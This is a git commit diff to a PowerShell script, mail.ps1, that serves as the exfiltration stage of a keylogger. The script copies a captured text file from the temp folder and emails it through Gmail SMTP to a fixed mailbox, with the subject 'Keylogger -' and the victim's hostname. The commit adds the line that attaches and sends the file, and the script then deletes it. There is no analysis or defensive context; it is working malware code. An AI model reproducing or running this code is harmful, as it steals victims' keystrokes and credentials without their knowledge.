26c05af6a86e34dc4f1ffc1c1dd6255485c47b6e
Miguel Angel Rocha Vázquez <miguel_rocha00715@hotmail.com>
2017-08-25 20:59:49 -0500

    Update mail.ps1

--- mail.ps1
+++ mail.ps1
@@ -1,5 +1,5 @@
-New-item -path $ENV:temp\test -type directory
-Copy-Item -Path $env:temp\testing123.txt -Destination $env:temp\test
+New-item -path "$ENV:temp\test" -type directory
+Copy-Item -Path "$env:temp\testing123.txt" -Destination "$env:temp\test"
 timeout 10
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
@@ -9,5 +9,6 @@ $ReportEmail = New-Object System.Net.Mail.MailMessage
 $ReportEmail.From = 'pruebapoloa@gmail.com'
 $ReportEmail.To.Add('pruebapoloa@gmail.com')
 $ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+$ReportEmail.Attachments.Add("$ENV:temp\test\testing123.txt");$SMTPInfo.Send($ReportEmail);
 timeout 10
-Remove-Item $env:temp\test\testing123.txt
+Remove-Item "$env:temp\test\testing123.txt"
